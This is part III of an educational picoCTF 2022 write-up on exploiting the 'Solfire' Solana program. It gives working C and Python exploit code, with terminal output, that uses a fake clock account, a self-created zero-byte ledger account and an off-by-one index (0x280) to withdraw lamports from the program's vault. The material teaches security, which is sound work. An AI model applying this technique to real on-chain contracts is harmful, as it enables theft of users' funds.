---
title:  picoCTF 2022 - Binary Exploitation - Solfire (500 points) - Part III
description: Stealing a few lamports, and then a lot more, after tracking down the actual bug.
hide_index: true
image:
  path: /img/reference/pico-ctf-2022-00000.png
  width: 1024
  height: 512
  thumb: /img/reference/pico-ctf-2022-00000.thumb.png
  alt: Linux Terminal
---

# picoCTF 2022 - Solfire (Part III)

> **Note**: This article is part of our [picoCTF 2022 Greatest Hits Guide]({% link _reference/hacking-101/picoctf-2022-greatest-hits.md %}).

This is the third part of a *three part series*. In Part III, we figure out how to exploit `solfire.so` and steal some lamports.

I. [Part I - Reversing the Binary]({% link _reference/hacking-101/picoctf-2022-greatest-hits/solfire.md %})  
II. [Part II - Environment Setup]({% link _reference/hacking-101/picoctf-2022-greatest-hits/solfire/part-2.md %})  
III. [Part III - Exploitation]({% link _reference/hacking-101/picoctf-2022-greatest-hits/solfire/part-3.md %}) (you are here)

## The Basics

Recall from [Part I]({% link _reference/hacking-101/picoctf-2022-greatest-hits/solfire.md %}) that functions from `solfire.so` must be called with 5 accounts. For `handle_create` they should be in the following order (for deposit/withdraw the order is slightly different):

- [0] - The `C1ock` address
- [1] - The *System* address
- [2] - The *ledger* address
- [3] - Not used
- [4] - The *user* address

**To start with, let's see if we can get `handle_create` to work, since we'll need a ledger account in order to call `handle_deposit` or `handle_withdraw`.**

Recall from our analysis in [Part I]({% link _reference/hacking-101/picoctf-2022-greatest-hits/solfire.md %}) that in order to successfully call `handle_create` we must supply the actual address of the ledger account and provide 5 bytes of instruction data, where the 5th byte gets used as the seed. How does this work? These addresses are called [Program Derived Addresses (PDA's)](https://docs.solana.com/developing/programming-model/calling-between-programs#program-derived-addresses) and are special addresses that can only be used by programs and are deterministically derived from the program's public key and a seed.

---

**In order to conveniently do these calculations from our python script, I've pulled together some python code from various sources to assist in these calculations: [solana_helpers.py]({% link _reference/hacking-101/picoctf-2022-greatest-hits/solfire/solana_helpers.py %}) _(see code for source links and licenses)_**
{:.alert .alert-success}

---

We can use the function `find_program_address` from `solana_helpers.py` (*see link above*) to calculate a PDA like this:

```python
from base58 import b58decode, b58encode
from solana_helpers import find_program_address
ledger, ledgernonce = find_program_address([b""], b58decode(program_pubkey))
ledger = b58encode(ledger).decode()
print(f"ledger: {ledger} {ledgernonce}")
```

The function has an input that is the seed (in this case the seed is empty), and returns an address and a `nonce`. The `nonce` is an 8-bit value that is appended to the seed that ensures that the derived-hash is an address that is *not* on the ed25519 curve (which is required for PDA's). It is this `nonce` value that we are required to include in the instruction data for `handle_create`.

**Likewise, since we need the vault address as well, we can do the same calculation with the seed `"vault"`.**

Let's write a new program to call `handle_create`. In addition to the 5 accounts that solfire needs, our program will need an additional address: the address of the `solfire.so` contract itself. For simplicity, we will pass these addresses in the same order as required by `handle_create`, and simply add the solfire address to the end.

```c
uint8_t nonce = params->data[0];
sol_log("About to call solfire handle_create!");

// There must be exactly 5 addresses
SolAccountMeta meta[] = {
  {params->ka[0].key /* clock */, false, false},
  {params->ka[1].key /* system */, false, false}, /* must be system */
  {params->ka[2].key /* ledger */, true, false}, /* "ledger" */
  {params->ka[3].key /* vault */, false, false}, /*not used */
  {params->ka[4].key /* user */, true, true}, /* funding account - must be writeable, must be signed */
};

uint8_t buf[5] = {0};
buf[0] = 0; //[0-4] code - 0 is `handle_create`
buf[4] = nonce; //[4] nonce

const SolInstruction instruction = {params->ka[5].key /* program */, 
                                    meta, SOL_ARRAY_SIZE(meta),
                                    buf,  SOL_ARRAY_SIZE(buf)};

sol_invoke_signed(&instruction, params->ka, params->ka_num, (SolSignerSeeds*)0, 0);
```

Recall: the first address **must** contain the substring `"C1ock"`. Since `solfire` reads from this address, I originally assumed it was required to be a valid address with properly allocated data. **However, it turns out that the Solana runtime will pad out data for unknown addresses with zeros**, and since a zero will bypass the timestamp check, we don't actually need to do anything special other than pass in a properly encoded b58 address containing the substring `C1ock` (that *isn't* the sysvar address). ie: `C1ock111111111111111111111111111111111111111` will work.

> On the topic of doing a lot of unnecessary work, before I understood this, I wrote a small go program to bruteforce the seed required such that my own program could properly create a program derived address containing the substring `"C1ock"`. It was very naive but would generally complete within a minute or two. *However, this is a post for another time.*

Now, let's modify our script to send in the address metadata and the instruction data:

```python
#metadata
p.sendline("6")
p.sendline(f"r C1ock111111111111111111111111111111111111111")
p.sendline(f"r 11111111111111111111111111111111")
p.sendline(f"w {ledger}")
p.sendline(f"w {vault}")
p.sendline(f"ws {user_pubkey}")
p.sendline(f"r {program_pubkey}")

#instructions
buf= p8(ledgernonce)
p.sendline(str(len(buf)))
p.send(buf)
```

Immediately we notice that our user balance has changed! (Remember, it cost us 1 lamport to create the ledger account using `handle_create`): 

```
$ python3 connect2.py
[+] Opening connection to localhost on port 8080: Done
program: Ew7GBvH4DQyPF7SMdV398ymLoDpYLgiHg4TNBWwee6Da
solve: 5ucYQinyYj8UXusExJPDPYffnccUPZ2JRLg9i9EWPHk7
user: 8ywjtRxY6gBf5dTqKSy8RymafB9oHBVpzRdvoNZFQaUM
ledger: 41La5Ue3q5jLBecFFfC6XGecn8pbiv3tLbGaqkVsr3zK 255
vault: AZTwNNQ6waZVQgBXEmP62DZYpAjU3o9xp2oVftZiA3dU 254
user bal: 9
vault bal: 1000000
```
{:.contains-term}

And if we check our log output, we can verify that `handle_create` was called and it invoked another instruction (`CreateAccount`) on the system account:

```
  Log Messages:
    Program 5ucYQinyYj8UXusExJPDPYffnccUPZ2JRLg9i9EWPHk7 invoke [1]
    Program log: Solfire Basic Invocation
    Program log: Hello!
    Program log: About to call solfire handle_create!
    Program Ew7GBvH4DQyPF7SMdV398ymLoDpYLgiHg4TNBWwee6Da invoke [2]
    Program log: Solfire start
    Program log: handle_create
    Program 11111111111111111111111111111111 invoke [3]
    Program 11111111111111111111111111111111 success
    Program Ew7GBvH4DQyPF7SMdV398ymLoDpYLgiHg4TNBWwee6Da consumed 44092 of 198625 compute units
    Program Ew7GBvH4DQyPF7SMdV398ymLoDpYLgiHg4TNBWwee6Da success
    Program 5ucYQinyYj8UXusExJPDPYffnccUPZ2JRLg9i9EWPHk7 consumed 45469 of 200000 compute units
    Program 5ucYQinyYj8UXusExJPDPYffnccUPZ2JRLg9i9EWPHk7 success
```
{:.contains-term}

## Petty Theft

Let's now attempt the first attack that came to mind in [Part I]({% link _reference/hacking-101/picoctf-2022-greatest-hits/solfire.md %}):

1. Create the ledger account with `handle_create`
2. Call `handle_deposit` with **both** account 3 and account 4 set to *user*. This will transfer funds from the *user* to *user* while incrementing the ledger's "deposit" record.
3. Call `handle_withdraw` with account 3 as *user* and account 4 as *vault*. If we use the same ledger entry from step 2 then we will be able to withdraw up to the amount of lamports already recorded in the ledger.

Since we know we are left with 9 lamports after step 1, we will just hardcode the transfers to use 9 lamports. For convenience, we will simply use entry #0 in the ledger.

<div class="panel-group">
  <div class="panel panel-info">
    <div class="panel-heading">
      <h3 class="panel-title">
        <a data-toggle="collapse" href="#collapseCode" aria-expanded="false" aria-controls="collapseCode">
        Code for petty-theft <small>(click to expand)</small>
        <i class="glyphicon glyphicon-menu-left pull-right"></i>
        <i class="glyphicon glyphicon-menu-down pull-right"></i>
        </a>
      </h3>
    </div>
    <div id="collapseCode" class="panel-collapse collapse">
<div class="panel-body" markdown="1">

```c
#include <solana_sdk.h>

// required order of params
#define CLOCK 0
#define SYSTEM 1
#define LEDGER 2
#define VAULT 3
#define USER 4
#define SOLFIRE 5

void solfire_create(SolParameters *params, uint8_t ledger_nonce)
{
  sol_log("crEate!");
  
  // There must be exactly 5 addresses
  SolAccountMeta meta[] = {
    {params->ka[CLOCK].key /* clock */, false, false},
    {params->ka[SYSTEM].key /* system */, false, false}, /* must be system */
    {params->ka[LEDGER].key /* ledger */, true, false}, /* "ledger" */
    {params->ka[VAULT].key /* vault */, false, false}, /*not used */
    {params->ka[USER].key /* user */, true, true}, /* funding account - must be writeable, must be signed */
  };

  uint8_t buf[5] = {0};
  buf[0] = 0; //[0-4] code - 0 is `handle_create`
  buf[4] = ledger_nonce; //[4] nonce

  const SolInstruction instruction = {params->ka[SOLFIRE].key /* program */, 
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf,  SOL_ARRAY_SIZE(buf)};

  sol_invoke_signed(&instruction, params->ka, params->ka_num, (SolSignerSeeds*)0, 0);
}

void solfire_deposit(SolParameters *params)
{
  sol_log("dePosit!");
  
  // There must be exactly 5 addresses
  SolAccountMeta meta[] = {
    {params->ka[CLOCK].key /* clock */, false, false},
    {params->ka[SYSTEM].key /* system */, false, false}, /* must be system */
    {params->ka[LEDGER].key /* ledger */, true, false}, /* "ledger" - must be writeable, must be owned */
    {params->ka[USER].key /* user */, true, true}, /* funding account - must be writeable, must be signed */
    {params->ka[USER].key /* user */, true, false}, /* receiving account, must be writable*/
  };

  uint8_t buf[12] = {0};
  buf[0] = 1; //[0-4] code
  buf[4] = 0; //[4-8] entry
  buf[8] = 9; //[8-12] amount

  const SolInstruction instruction = {params->ka[SOLFIRE].key /* program */, 
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf,  SOL_ARRAY_SIZE(buf)};

  sol_invoke_signed(&instruction, params->ka, params->ka_num, (SolSignerSeeds*)0, 0);
}

void solfire_withdrawl(SolParameters *params, uint8_t vault_nonce)
{
  sol_log("withDraw!");

  // There must be exactly 5 addresses
  SolAccountMeta meta[] = {
    {params->ka[CLOCK].key /* clock */, false, false},
    {params->ka[SYSTEM].key /* system */, false, false}, /* must be system */
    {params->ka[LEDGER].key /* ledger */, true, false}, /* "ledger" - must be writeable, must be owned */
    {params->ka[USER].key /* user */, true, true}, /* receiving account - must be writeable */
    {params->ka[VAULT].key /* vault */, true, false}, /*must be vault, must be writable*/
  };

  uint8_t buf[16] = {0};
  buf[0] = 2; //[0-4] code
  buf[4] = 0; //[4-8] entry
  buf[8] = 9; //[8-12] amount
  buf[12] = vault_nonce; //[12] vault nonce

  const SolInstruction instruction = {params->ka[SOLFIRE].key /* program */, 
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf,  SOL_ARRAY_SIZE(buf)};

  sol_invoke_signed(&instruction, params->ka, params->ka_num, (SolSignerSeeds*)0, 0);
}

uint64_t basic(SolParameters *params)
{
  sol_log("Hello!");

  uint8_t ledger_nonce = params->data[0];
  uint8_t vault_nonce = params->data[1];

  solfire_create(params, ledger_nonce);
  solfire_deposit(params);
  solfire_withdrawl(params, vault_nonce);
  
  return SUCCESS;
}

extern uint64_t entrypoint(const uint8_t *input) {
  sol_log("Solfire Basic Invocation");

  SolAccountInfo accounts[6];
  SolParameters params = (SolParameters){.ka = accounts};

  if (!sol_deserialize(input, &params, SOL_ARRAY_SIZE(accounts))) {
    return ERROR_INVALID_ARGUMENT;
  }

  if (params.ka_num < 6) {
    sol_log("Not enough accounts");
    return ERROR_NOT_ENOUGH_ACCOUNT_KEYS;
  }

  return basic(&params);
}
```

</div>
    </div>
  </div>
</div>

Our python script will need a small update as well, as we now must send along the *vault* nonce in the instruction data:

```python
#instructions
buf= p8(ledgernonce) + p8(vaultnonce)
p.sendline(str(len(buf)))
p.send(buf)
```

Let's run the script and confirm that we successfully stole some lamports:

```
$ python3 connect3.py
[+] Opening connection to localhost on port 8080: Done
program: Ew7GBvH4DQyPF7SMdV398ymLoDpYLgiHg4TNBWwee6Da
solve: 3Hh99uFZVHmh5cTy8FgNpdwdtt92vSKNgar4XRfeunot
user: 77c7dn2XD1wRu7njS6c6NWuRUPgUzb65x526z87CrJpe
ledger: 41La5Ue3q5jLBecFFfC6XGecn8pbiv3tLbGaqkVsr3zK 255
vault: AZTwNNQ6waZVQgBXEmP62DZYpAjU3o9xp2oVftZiA3dU 254
user bal: 18
vault bal: 999991
```
{:.contains-term}

**Aha! We started with 10 lamports and now have 18! Victory is within our grasp!**
> **Narrator**: *Or is it?*

## Problems, Problems, Problems

Unfortunately, this is about when our luck runs out. Since you only have 9 lamports, you can't transfer more than that to yourself. You can keep calling deposit to rack up the amount you can withdraw, but it doesn't take long before you start seeing something like the following in your error logs:

```
    Program log: Solfire start
    Program Ew7GBvH4DQyPF7SMdV398ymLoDpYLgiHg4TNBWwee6Da consumed 17258 of 17258 compute units
    Program failed to complete: exceeded maximum number of instructions allowed (17258) at instruction #1131
    Program Ew7GBvH4DQyPF7SMdV398ymLoDpYLgiHg4TNBWwee6Da failed: Program failed to complete
    Program 5HXGNZ1WizZFrqWHSd6xWSSnVBwVHBHBYVnfRHuDJj55 consumed 200000 of 200000 compute units
    Program 5HXGNZ1WizZFrqWHSd6xWSSnVBwVHBHBYVnfRHuDJj55 failed: Program failed to complete
```
{:.contains-term}

The key part being `"consumed 200000 of 200000 compute units"`. Apparently, there is an upper-limit on the number of computations a given instruction/transaction is allowed. There are some mechanisms to bump this number up slightly, but they are required to be entered into the transaction directly and not executed as a cross-program invocation. The main problem here is that every call to `solfire` is incredibly expensive - consuming over 20% of our total budget. As pointed out in [Part I]({% link _reference/hacking-101/picoctf-2022-greatest-hits/solfire.md %}) - this is likely due to the use of b58encode inside the contract itself.

## A path forward

In trying desperately to find ways to either increase the compute budget or reduce the costs of computing, we come to the realization that calling `handle_create` is not actually necessary! The requirements for the ledger account are simply that the account is owned by the `solfire` program. We can actually just call `CreateAccount` ourselves and specify `solfire` as the owner. This saves us a whole call into the `solfire` entrypoint!

```c
void solfire_create(SolParameters *params, uint8_t ledger_nonce)
{
  sol_log("crEate!");
  
  const SolSignerSeed seed = {&ledger_nonce, 1};
  const SolSignerSeeds signers_seeds = {&seed, 1};

  SolAccountMeta meta[] = {
    {params->ka[USER].key /* user */, true, true},
    {params->ka[LEDGER].key /* ledger */, true, true}
  };
  uint8_t buf[0x34] = {0};
  buf[0] = 0; //[0-4] code
  buf[4] = 0x0; //[4-12] lamports to transfer
  buf[12] = 0x00; //[12-20] SIZE TO ALLOCATE!
  buf[13] = 0x28; // 0x2800 in little endian - same as handle_create
  // SET OWNER TO BE SOLFIRE PROGRAM - THIS IS REQUIRED FOR EXPLOIT TO WORK
  sol_memcpy(&buf[20], params->ka[SOLFIRE].key /* program */, 32); //[20-52] new owner

  const SolInstruction instruction = {params->ka[SYSTEM].key /* system */,
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf,  SOL_ARRAY_SIZE(buf)};

  sol_invoke_signed(&instruction, params->ka, params->ka_num, &signers_seeds, 1);
}
```

**NOTE**: we'll also have to change the following line from `program_pubkey` to `solve_pubkey` since the ledger account now needs to be signed by our *own program*:

```python
ledger, ledgernonce = find_program_address([b""], b58decode(solve_pubkey))
```

With this minor tweak, we can steal a couple more lamports, **but unfortunately it's nowhere near the 50,000 we need**.

## Back to Basics

We've hit a brick wall. It's time to realize that our assumed exploit (transferring from *user* to *user*) is not the way. We must have missed something during our initial analysis.

Fortunately, explicitly writing out the size of the buffer allocated for the ledger account (`0x2800`) has jogged something in our memory.

What were those bound checks in `handle_deposit`/`handle_create` again?

```c
if (0x280 < input[1]) {
  sol_panic(s_./src/solfire/solfire.c_00013d76,0x18,0x5f);
}
```

**Aha!** We are allowed to specify an offset of `0x280`. Internally the code will calculate `0x280` * `0x10` and use that as the start of the entry in the ledger. However, the buffer is only `0x2800` large, and the offset is calculated as `0x2800`, therefore this is past the end of the buffer!

Let's skip the call the `handle_deposit` entirely, and see if we can withdraw even `1` lamport when using `0x280` as the index.

```
Program failed to complete: BPF program Panicked in ./src/solfire/solfire.c at 175:0
```
{:.contains-term}

*hmmm*... No such luck. It's failing at the point where it makes sure that the deposits exceed the amount being withdrawn. It's reading past the end of the buffer, but there must be zeros there since even attempting to withdraw `1` lamport is too much.

**Wait a second**. Remember how reading from `C1ock111111111111111111111111111111111111111` mysteriously worked even though it wasn't actually a valid account with data? Reading up some more, it seems that `0x2800` is actually the maximum number of bytes you can request to be allocated. What if the runtime is padding the data out with up-to `0x2800` zeros? Since we're *now* in control of allocating the ledger account in the first place, **what if we allocated `0` data bytes instead**? If we're right, the runtime will pad it out with `0x2800` zeros, and our read will now go past the end of the padding and hit something new.

```
$ python3 connect5.py
[+] Opening connection to localhost on port 8080: Done
program: Ew7GBvH4DQyPF7SMdV398ymLoDpYLgiHg4TNBWwee6Da
solve: AWzyLGFoGgALfe2evpXkZRALiNPAzcLVBpuor8qk5xNn
user: FLQNdH5cWEg5SzfZV3dZk7oGeXLyomFioHYaexBpRy1Q
ledger: E9woYZWvQsqzthXZ3uyBjwFaXcyjkYuBzs4EVS92AEuw 252
vault: AZTwNNQ6waZVQgBXEmP62DZYpAjU3o9xp2oVftZiA3dU 254
user bal: 11
vault bal: 999999
```
{:.contains-term}

**SUCCESS!**

All that's left now is to bump up the number of lamports to withdraw. There's a limit, obviously, depending on whatever value happens to be in memory at that spot. **To be honest, we're still not quite sure what it is, but it's more than the 50,000 that we need**. For simplicity, let's withdraw `0x10000` lamports and see what happens:

```c
void solfire_withdrawl(SolParameters *params, uint8_t vault_nonce)
{
  sol_log("withDraw!");

  // There must be exactly 5 addresses
  SolAccountMeta meta[] = {
    {params->ka[CLOCK].key /* clock */, false, false},
    {params->ka[SYSTEM].key /* system */, false, false}, /* must be system */
    {params->ka[LEDGER].key /* ledger */, true, false}, /* "ledger" - must be writeable, must be owned */
    {params->ka[USER].key /* user */, true, true}, /* receiving account - must be writeable */
    {params->ka[VAULT].key /* vault */, true, false}, /*must be vault, must be writable*/
  };

  uint8_t buf[16] = {0};
  buf[0] = 2; //[0-4] code
  
  buf[4] = 0x80; //[4-8] index
  buf[5] = 0x02; // 0x280 in little endian

  buf[8] = 0x00; //[8-12] amount
  buf[9] = 0x00;
  buf[10] = 0x01; //0x10000 in little-endian

  buf[12] = vault_nonce; //[12] vault nonce

  const SolInstruction instruction = {params->ka[SOLFIRE].key /* program */, 
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf,  SOL_ARRAY_SIZE(buf)};

  sol_invoke_signed(&instruction, params->ka, params->ka_num, (SolSignerSeeds*)0, 0);
}
```

```
$ python3 connect5.py
[+] Opening connection to localhost on port 8080: Done
program: Ew7GBvH4DQyPF7SMdV398ymLoDpYLgiHg4TNBWwee6Da
solve: 47xVEjTeKyApnViADRZCLC2PpnmQpQpEZDfcsWYoMkC9
user: BPR11AMCQfViuJqxyL3FwWPWzMm4AFJeYEPwoFr1ue1D
ledger: EUUvConfMPo75TiJPPTEPtuS4zNdnCPR3yhFJWZJxEcz 255
vault: AZTwNNQ6waZVQgBXEmP62DZYpAjU3o9xp2oVftZiA3dU 254
user bal: 65546
vault bal: 934464
congrats!
flag: ""
```
{:.contains-term}

**And when we hit the challenge server?**

```
$ python3 connect5.py
[+] Opening connection to saturn.picoctf.net on port 58898: Done
program: 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn
solve: 47xVEjTeKyApnViADRZCLC2PpnmQpQpEZDfcsWYoMkC9
user: 2wnrrp3k2q2Qtb7AHWqkT5ajsrdncRbpe4EfNkYLD7U9
ledger: EUUvConfMPo75TiJPPTEPtuS4zNdnCPR3yhFJWZJxEcz 255
vault: 28Xm4VxYY2wAywq8pNMfYRrhs99aTGEsyLoE4hozDgu6 255
user bal: 65546
vault bal: 934464
congrats!
flag: "picoCTF{===REDACTED===}"
```
{:.contains-term}

**Boom**! We did it. Did you miss anything? Here's a recap:

## TLDR

1. To successfully call into `handle_withdraw`, the first account (index 0) must contain the substring `C1ock` when b58 encoded. It does not need to exist or have initialized data, but it **MUST NOT** be `SysvarC1ock11111111111111111111111111111111` (that account contains valid data and will not pass the timestamp check).
2. `handle_withdraw` contains an off-by-one error, allowing you to read/write past the end of ledger data.
3. This is *only* exploitable if you manually create the account yourself with exactly `0` data bytes allocated and specify `solfire.so` as the owner.
4. Call `handle_withdraw` with the offset set to `0x280` and a lamport value of approximately 50,000 or more (*but not too much more*). You will also be required to know the nonce for the vault account.
5. ...
6. Profit!


Here are the 3 parts again if you want to go back:

I. [Part I - Reversing the Binary]({% link _reference/hacking-101/picoctf-2022-greatest-hits/solfire.md %})  
II. [Part II - Environment Setup]({% link _reference/hacking-101/picoctf-2022-greatest-hits/solfire/part-2.md %})  
III. [Part III - Exploitation]({% link _reference/hacking-101/picoctf-2022-greatest-hits/solfire/part-3.md %}) (you are here)

Or, if you want to read about other challenges, head back to the [picoCTF 2022 Greatest Hits Guide]({% link _reference/hacking-101/picoctf-2022-greatest-hits.md %}).